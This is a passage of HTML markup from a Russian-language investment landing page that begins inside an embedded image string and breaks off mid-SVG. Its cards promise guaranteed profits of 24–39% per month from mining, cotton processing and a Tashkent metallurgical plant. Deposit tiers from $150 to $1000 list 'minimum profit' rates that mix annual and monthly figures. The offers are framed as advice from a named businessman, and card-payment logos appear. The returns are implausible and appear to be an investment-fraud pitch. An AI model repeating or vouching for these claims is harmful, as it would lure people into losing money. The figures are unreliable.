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"
              ></image>
            </defs>
          </svg>
        </div>
        <center>
          <img src="assets/rus.png" class="svgnone" alt="" />
        </center>
        <div class="text-white flex sm:flex-wrap">
          <div class="w-1/3 sm:w-full">
            <article class="flex post items-end">
              <div class="absolute w-full h-full top-0 left-0 post-wrapper">
                <img class="h-full sm:h-auto sm:w-full tr-center" src="assets/card_1.jpg" alt="" />
              </div>
              <div class="relative z-10 p-8 sm:px-4">
                <h3 class="mb-4 font-bold font-ubuntu text-4xl sm:text-3xl">Металлоинвест</h3>
                <p class="mb-10sm:text-xl text-2xl font-ubuntu">от 33% прибыли в месяц</p>
                <p class="mb-8 text-lg sm:text-base">Инвестиции в горнодобывающую промышленность</p>
                <div>
                  <center>
                    <a
                      href="javascript:void(0)"
                      class="inline-block px-4 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3 scrl-top"
                      >Подать заявку</a
                    >
                  </center>
                </div>
              </div>
            </article>
          </div>
          <div class="w-1/3 sm:w-full">
            <article class="flex post items-end">
              <div class="absolute w-full h-full top-0 left-0 post-wrapper">
                <img class="h-full tr-center sm:h-auto sm:w-full" src="assets/card_2.jpg" alt="" />
              </div>
              <div class="relative z-10 p-8 sm:px-4">
                <h3 class="mb-2 font-bold font-ubuntu text-4xl sm:text-3xl">
                  Переработка хлопчатника
                </h3>
                <p class="mb-4 sm:text-xl text-2xl font-ubuntu">до 24% прибыли в месяц</p>
                <p class="mb-8 text-lg sm:text-base">
                  Инвестиции в инновационные заводы по переработке хлопчатника
                </p>
                <div>
                  <center>
                    <a
                      href="javascript:void(0)"
                      class="inline-block px-4 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3 scrl-top"
                      >Подать заявку</a
                    >
                  </center>
                </div>
              </div>
            </article>
          </div>
          <div class="w-1/3 sm:w-full">
            <article class="flex post items-end">
              <div class="absolute w-full h-full top-0 left-0 post-wrapper">
                <img class="h-full sm:h-auto sm:w-full tr-center" src="assets/card_3.jpg" alt="" />
              </div>
              <div class="relative z-10 p-8 sm:px-4">
                <h3 class="mb-2 font-bold font-ubuntu text-4xl sm:text-3xl">Металлургия</h3>
                <p class="mb-4 sm:text-xl text-2xl font-ubuntu">
                  прибыль составляет 25-39% ежемесячно
                </p>
                <p class="mb-8 text-lg sm:text-base">
                  Инвестиции в Ташкентский металлургический завод
                </p>
                <div>
                  <center>
                    <a
                      href="javascript:void(0)"
                      class="inline-block text-center px-4 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3 scrl-top"
                      >Подать заявку</a
                    >
                  </center>
                </div>
              </div>
            </article>
          </div>
        </div>
      </section>

      <section id="partners" class="container sm:px-0 flex flex-col items-center mx-auto">
        <div style="display: flex; justify-content: center">
          <svg
            width="48"
            height="48"
            viewBox="0 0 48 48"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <rect x="8" y="4" width="32" height="40" rx="4" fill="white"></rect>
            <path
              d="M36 4H24V18L19 15L14 18V4H12C9.8 4 8 5.8 8 8V40C8 42.2 9.8 44 12 44H36C38.2 44 40 42.2 40 40V8C40 6.93913 39.5786 5.92172 38.8284 5.17157C38.0783 4.42143 37.0609 4 36 4ZM35.36 36.82C35.14 37 32.94 38.5 32.1 39C31.26 39.58 28 41.44 28.52 37.84C29.78 30.56 32.22 26.24 29.3 28.12C28.54 28.58 28.1 28.86 27.82 29C27.56 29.22 27.58 29.2 27.36 28.82C27.14 28.44 27.06 28.46 27.34 28.26C27.34 28.26 31.8 24.68 33.44 24.56C35 24.42 34.62 26.34 34.48 27.22C33.56 30.92 31.88 36.3 32.14 37.08C32.36 37.86 34 36.62 34.88 36C34.88 36 35 35.86 35.22 36.1C35.44 36.44 35.66 36.6 35.36 36.82ZM33.94 22.12C32.8 22.12 31.88 21.2 31.88 20.06C31.88 18.92 32.8 18 33.94 18C35.08 18 36 18.92 36 20.06C36 21.2 35.08 22.12 33.94 22.12Z"
              fill="#4290FC"
            ></path>
          </svg>
          <h2 class="mb-8 text-4xl sm:text-3xl font-bold font-ubuntu text-center text-wh">
            Совет от Алишэра Бурхановича
          </h2>
        </div>
        <div class="block2">
          <div class="otstp1">
            <p class="fleximg">
              <svg
                width="44"
                height="6"
                class="pols"
                viewBox="0 0 44 6"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <rect width="44" height="6" fill="white"></rect>
              </svg>
              <svg
                width="48"
                height="48"
                viewBox="0 0 48 48"
                class="svgimg"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M18 8C9.16 8 2 15.16 2 24C2 32.84 9.16 40 18 40C26.84 40 34 32.84 34 24C34 15.16 26.84 8 18 8ZM18 36C11.38 36 6 30.62 6 24C6 17.38 11.38 12 18 12C24.62 12 30 17.38 30 24C30 30.62 24.62 36 18 36ZM40.5 7.5L46 10L40.5 12.5L38 18L35.5 12.5L30 10L35.5 7.5L38 2L40.5 7.5Z"
                  fill="white"
                ></path>
                <path
                  d="M21.5371 30.3359L20.502 26.9375H15.2969L14.2617 30.3359H11L16.0391 16H19.7402L24.7988 30.3359H21.5371ZM19.7793 24.3984C18.8223 21.319 18.2819 19.5775 18.1582 19.1738C18.041 18.7702 17.9564 18.4512 17.9043 18.2168C17.6895 19.0501 17.0742 21.1107 16.0586 24.3984H19.7793Z"
                  fill="#4290FC"
                ></path>
              </svg>
              Первый платёж 150$<br />
              минимальная прибыль 25%<br />
              годовых
            </p>
            <p class="fleximg">
              <svg
                width="44"
                height="6"
                class="pols"
                viewBox="0 0 44 6"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <rect width="44" height="6" fill="white"></rect>
              </svg>
              <svg
                width="48"
                height="48"
                viewBox="0 0 48 48"
                class="svgimg"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M18 8C9.16 8 2 15.16 2 24C2 32.84 9.16 40 18 40C26.84 40 34 32.84 34 24C34 15.16 26.84 8 18 8ZM18 36C11.38 36 6 30.62 6 24C6 17.38 11.38 12 18 12C24.62 12 30 17.38 30 24C30 30.62 24.62 36 18 36ZM40.5 7.5L46 10L40.5 12.5L38 18L35.5 12.5L30 10L35.5 7.5L38 2L40.5 7.5Z"
                  fill="white"
                ></path>
                <path
                  d="M21.5371 30.3359L20.502 26.9375H15.2969L14.2617 30.3359H11L16.0391 16H19.7402L24.7988 30.3359H21.5371ZM19.7793 24.3984C18.8223 21.319 18.2819 19.5775 18.1582 19.1738C18.041 18.7702 17.9564 18.4512 17.9043 18.2168C17.6895 19.0501 17.0742 21.1107 16.0586 24.3984H19.7793Z"
                  fill="#4290FC"
                ></path>
              </svg>
              Первый платёж 250$<br />
              минимальная прибыль 30%<br />
              годовых
            </p>
          </div>

          <div class="otstp2">
            <p class="fleximg">
              <svg
                width="44"
                height="6"
                class="pols"
                viewBox="0 0 44 6"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <rect width="44" height="6" fill="white"></rect>
              </svg>
              <svg
                width="48"
                height="48"
                viewBox="0 0 48 48"
                class="svgimg"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M18 8C9.16 8 2 15.16 2 24C2 32.84 9.16 40 18 40C26.84 40 34 32.84 34 24C34 15.16 26.84 8 18 8ZM18 36C11.38 36 6 30.62 6 24C6 17.38 11.38 12 18 12C24.62 12 30 17.38 30 24C30 30.62 24.62 36 18 36ZM40.5 7.5L46 10L40.5 12.5L38 18L35.5 12.5L30 10L35.5 7.5L38 2L40.5 7.5Z"
                  fill="white"
                ></path>
                <path
                  d="M21.5371 30.3359L20.502 26.9375H15.2969L14.2617 30.3359H11L16.0391 16H19.7402L24.7988 30.3359H21.5371ZM19.7793 24.3984C18.8223 21.319 18.2819 19.5775 18.1582 19.1738C18.041 18.7702 17.9564 18.4512 17.9043 18.2168C17.6895 19.0501 17.0742 21.1107 16.0586 24.3984H19.7793Z"
                  fill="#4290FC"
                ></path>
              </svg>
              Первый платёж 400$<br />
              минимальная прибыль 35%<br />
              годовых
            </p>
            <p class="fleximg">
              <svg
                width="44"
                height="6"
                class="pols"
                viewBox="0 0 44 6"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <rect width="44" height="6" fill="white"></rect>
              </svg>
              <svg
                width="48"
                height="48"
                class="svgimg"
                viewBox="0 0 48 48"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M18 8C9.16 8 2 15.16 2 24C2 32.84 9.16 40 18 40C26.84 40 34 32.84 34 24C34 15.16 26.84 8 18 8ZM18 36C11.38 36 6 30.62 6 24C6 17.38 11.38 12 18 12C24.62 12 30 17.38 30 24C30 30.62 24.62 36 18 36ZM40.5 7.5L46 10L40.5 12.5L38 18L35.5 12.5L30 10L35.5 7.5L38 2L40.5 7.5Z"
                  fill="white"
                ></path>
                <path
                  d="M21.5371 30.3359L20.502 26.9375H15.2969L14.2617 30.3359H11L16.0391 16H19.7402L24.7988 30.3359H21.5371ZM19.7793 24.3984C18.8223 21.319 18.2819 19.5775 18.1582 19.1738C18.041 18.7702 17.9564 18.4512 17.9043 18.2168C17.6895 19.0501 17.0742 21.1107 16.0586 24.3984H19.7793Z"
                  fill="#4290FC"
                ></path>
              </svg>
              Первый платёж 500$<br />
              минимальная прибыль 5%<br />
              месячных
            </p>
          </div>
        </div>
        <center>
          <div class="cenblv">
            <svg
              width="44"
              height="6"
              class="pols2"
              viewBox="0 0 44 6"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <rect width="44" height="6" fill="white"></rect>
            </svg>
            <svg
              width="48"
              class="star"
              height="48"
              viewBox="0 0 48 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M24 45C35.598 45 45 35.598 45 24C45 12.402 35.598 3 24 3C12.402 3 3 12.402 3 24C3 35.598 12.402 45 24 45Z"
                fill="#4290FC"
              ></path>
              <path
                d="M24 11L27.9 18.9L36.6 20.2L30.3 26.3L31.8 35L24 30.9L16.2 35L17.7 26.3L11.4 20.2L20.1 18.9L24 11Z"
                fill="#FFCA28"
              ></path>
            </svg>

            <p style="text-align: -webkit-left">
              Первый платёж 1000$<br />
              минимальная прибыль 15% <br />месячных
            </p>
          </div>
        </center>
        <div class="card">
          <div class="logos-slider">
            <div class="logos-slider-container">
              <img src="assets/1.png" />
              <img src="assets/2.png" />
              <img src="assets/3.png" />
              <img src="assets/4.png" />
              <img src="assets/5.png" />
            </div>

            <div class="logos-slider-container">
              <img src="assets/1.png" />
              <img src="assets/2.png" />
              <img src="assets/3.png" />
              <img src="assets/4.png" />
              <img src="assets/5.png" />
            </div>
          </div>
        </div>
        <div class="w-8/12 sm:w-full flex sm:flex-wrap items-center justify-between">
          <div
            class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
                d="M62.3524 11.2622H1.64759C0.736544 11.2622 0 11.9999 0 12.9098V51.0911C0 52.001 0.736544 52.7387 1.64759 52.7387H62.3524C63.2635 52.7387 64 52.001 64 51.0911V12.9098C64 11.9999 63.2635 11.2622 62.3524 11.2622ZM4.95524 23.7959H11.7858C12.7071 23.831 13.4493 24.1245 13.7054 25.1092L15.1909 32.2537C13.7314 28.5166 10.2142 25.4072 4.89858 24.12L4.95524 23.7959ZM13.2204 40.0905L9.27479 26.6106C12.111 28.4259 14.5269 31.3064 15.3779 33.3109L15.838 34.9755L20.153 23.9512H24.8215L17.8833 40.0871L13.2204 40.0905ZM28.2527 40.1019H23.847L26.6017 23.9342H31.0096L28.2527 40.1019ZM35.9195 40.3444C33.9445 40.324 32.0419 39.933 31.0108 39.4809L31.6306 35.8628L32.1983 36.12C33.6453 36.724 34.5824 36.9687 36.3467 36.9687C37.6125 36.9687 38.9688 36.4735 38.9813 35.3903C38.9892 34.682 38.4136 34.1767 36.698 33.3835C35.0255 32.6106 32.8113 31.3143 32.8385 28.9925C32.8623 25.8503 35.9309 23.6577 40.2856 23.6577C41.9921 23.6577 43.3598 24.0089 44.2323 24.3364L43.6374 27.8412L43.2397 27.6543C42.4283 27.3279 41.3847 27.0129 39.9422 27.0356C38.2176 27.0356 37.4176 27.754 37.4176 28.4259C37.4085 29.1829 38.3513 29.6815 39.8924 30.4316C42.434 31.5852 43.6091 32.9846 43.5932 34.8237C43.5592 38.1778 40.553 40.3444 35.9195 40.3444ZM55.013 40.1087C55.013 40.1087 54.6108 38.2503 54.4771 37.686C53.8357 37.686 49.3394 37.6792 48.834 37.6792C48.6629 38.1155 47.9082 40.1087 47.9082 40.1087H43.2816L49.8232 25.2928C50.2878 24.2401 51.0754 23.9512 52.1314 23.9512H55.5354L59.1014 40.1075L55.013 40.1087Z"
                fill="currentColor"
              ></path>
              <path
                d="M52.7388 29.7053L52.4419 28.3115C52.2175 28.92 51.8311 29.8979 51.8561 29.8549C51.8561 29.8549 50.4634 33.4435 50.1008 34.3738H53.7598C53.583 33.5636 52.7388 29.7053 52.7388 29.7053Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
                d="M17.055 29.2485C15.8561 29.2485 14.9372 29.6338 14.9372 29.6338L14.6833 31.1409C14.6833 31.1409 15.4414 30.8327 16.5893 30.8327C17.2408 30.8327 17.7168 30.9052 17.7168 31.4344C17.7168 31.7562 17.659 31.8752 17.659 31.8752C17.659 31.8752 17.1457 31.8332 16.9077 31.8332C15.3949 31.8332 13.8063 32.4769 13.8063 34.4247C13.8063 35.959 14.8476 36.3092 15.4947 36.3092C16.7287 36.3092 17.2612 35.5092 17.2884 35.5069L17.2306 36.1754H18.7706L19.4573 31.3596C19.4561 29.3143 17.6737 29.2485 17.055 29.2485ZM16.1915 34.844C15.6488 34.844 15.5071 34.4304 15.5071 34.1834C15.5071 33.7052 15.7666 33.1296 17.0482 33.1296C17.3474 33.1307 17.3791 33.1613 17.4289 33.1703C17.4629 33.465 17.2454 34.844 16.1915 34.844Z"
                fill="currentColor"
              ></path>
              <path
                d="M22.6164 30.8635C22.8623 30.8635 23.8107 30.9417 23.8107 30.9417L24.0317 29.3983C24.0317 29.3983 23.4175 29.2612 22.4181 29.2612C21.1241 29.2612 19.8119 29.7779 19.8119 31.5445C19.8119 33.5479 22.0011 33.344 22.0011 34.1893C22.0011 34.7513 21.3892 34.7978 20.9178 34.7978C20.1008 34.7978 19.3666 34.519 19.3643 34.5304L19.1309 36.0612C19.1728 36.0726 19.626 36.2743 21.0935 36.2743C21.4867 36.2743 23.7382 36.3762 23.7382 34.0522C23.7382 31.8788 21.6544 32.3083 21.6544 31.4346C21.6544 30.9995 21.9932 30.8635 22.6164 30.8635Z"
                fill="currentColor"
              ></path>
              <path
                d="M26.2957 31.0607H27.2215L27.4447 29.4153H26.5722L26.7501 28.3955H25.0017C24.9631 28.4329 23.9694 34.1473 23.9694 34.8408C23.9694 35.8731 24.5484 36.3309 25.3631 36.323C26.0011 36.3185 26.4985 36.1417 26.6742 36.093L26.8929 34.6063C26.7728 34.6063 26.5971 34.6584 26.4419 34.6584C25.8334 34.6584 25.7665 34.3332 25.8051 34.0941L26.2957 31.0607Z"
                fill="currentColor"
              ></path>
              <path
                d="M33.6237 21.5151H30.5031C30.0838 22.0817 29.6895 22.6845 29.3325 23.2738H34.8997C34.5133 22.6596 34.0861 22.0726 33.6237 21.5151Z"
                fill="currentColor"
              ></path>
              <path
                d="M57.9728 41.2975C57.9388 41.2465 57.9105 41.2079 57.8878 41.1841C57.8754 41.1728 57.8595 41.1603 57.8391 41.1547C57.8878 41.1513 57.9286 41.1332 57.9581 41.1026C57.9864 41.072 58.0023 41.0357 58.0023 40.9938C58.0023 40.9643 57.9932 40.936 57.9762 40.9099C57.9592 40.8839 57.9343 40.8646 57.9037 40.8544C57.8754 40.8431 57.8266 40.8374 57.7598 40.8374H57.5626V41.4096H57.6555V41.1671H57.7088C57.7405 41.1671 57.7666 41.1739 57.7813 41.1875C57.8051 41.2068 57.8391 41.251 57.8788 41.3201L57.9286 41.4108H58.0431L57.9728 41.2975ZM57.7666 41.0912H57.6533V40.919H57.7598C57.804 40.919 57.8334 40.9224 57.8504 40.9292C57.8686 40.936 57.8799 40.9462 57.8901 40.9586C57.8992 40.9722 57.9037 40.987 57.9037 41.0028C57.9037 41.0289 57.8946 41.0516 57.8754 41.0674C57.8561 41.0822 57.8187 41.0912 57.7666 41.0912Z"
                fill="currentColor"
              ></path>
              <path
                d="M35.8459 24.9995H28.3592C27.881 25.9049 27.5638 26.5893 27.4742 26.7593H36.5553C36.3502 26.1542 36.1145 25.5684 35.8459 24.9995Z"
                fill="currentColor"
              ></path>
              <path
                d="M11.6634 27.856L9.93993 32.9664L9.85041 27.856H7.29857L5.90027 36.1834H7.58752L8.65154 29.9058L8.80792 36.1834H10.0125L12.2595 29.9058L11.2634 36.1834H13.0538L14.4328 27.856H11.6634Z"
                fill="currentColor"
              ></path>
              <path
                d="M45.4039 29.2485C44.2028 29.2485 43.285 29.6338 43.285 29.6338L43.03 31.1409C43.03 31.1409 43.7892 30.8327 44.936 30.8327C45.5875 30.8327 46.0646 30.9052 46.0646 31.4344C46.0646 31.7562 46.0045 31.8752 46.0045 31.8752C46.0045 31.8752 45.4923 31.8332 45.2521 31.8332C43.7405 31.8332 42.153 32.4769 42.153 34.4247C42.153 35.959 43.1954 36.3092 43.8413 36.3092C45.0742 36.3092 45.6068 35.5092 45.6351 35.5069L45.5773 36.1754H47.1161L47.8028 31.3596C47.8062 29.3143 46.0226 29.2485 45.4039 29.2485ZM44.5428 34.844C43.9988 34.844 43.8583 34.4304 43.8583 34.1834C43.8583 33.7052 44.1178 33.1296 45.3994 33.1296C45.6974 33.1307 45.7292 33.1613 45.7802 33.1703C45.813 33.465 45.5943 34.844 44.5428 34.844Z"
                fill="currentColor"
              ></path>
              <path
                d="M58.0283 35.4167C57.9819 35.3306 57.9139 35.2648 57.8289 35.2195C57.745 35.1731 57.6589 35.1504 57.5683 35.1504C57.481 35.1515 57.3938 35.1742 57.3077 35.2195C57.2227 35.2648 57.1569 35.3306 57.1094 35.4167C57.0618 35.5017 57.038 35.5901 57.038 35.6818C57.038 35.7736 57.0618 35.8609 57.1094 35.9447C57.1558 36.0286 57.2215 36.0954 57.3054 36.143C57.3904 36.1895 57.4776 36.2133 57.5683 36.2133C57.6612 36.2133 57.7496 36.1895 57.8323 36.143C57.9162 36.0954 57.9819 36.0286 58.0283 35.9447C58.0771 35.8609 58.0986 35.7736 58.0986 35.6818C58.0986 35.5878 58.0759 35.4994 58.0283 35.4167ZM57.9547 35.9005C57.9162 35.9708 57.8618 36.024 57.7904 36.066C57.7201 36.1045 57.6476 36.1249 57.5717 36.1249C57.4946 36.1249 57.421 36.1045 57.3518 36.066C57.2805 36.0263 57.2272 35.9719 57.1864 35.9005C57.1456 35.8291 57.1275 35.7566 57.1275 35.6807C57.1275 35.6048 57.1467 35.5311 57.1887 35.4597C57.2283 35.3895 57.2816 35.3351 57.3541 35.2954C57.4266 35.2558 57.498 35.2388 57.5717 35.2388C57.6453 35.2388 57.7179 35.2569 57.787 35.2954C57.8595 35.3351 57.9128 35.3883 57.9524 35.4597C57.9921 35.5311 58.0136 35.6048 58.0136 35.6807C58.0136 35.7566 57.9943 35.8303 57.9547 35.9005Z"
                fill="currentColor"
              ></path>
              <path
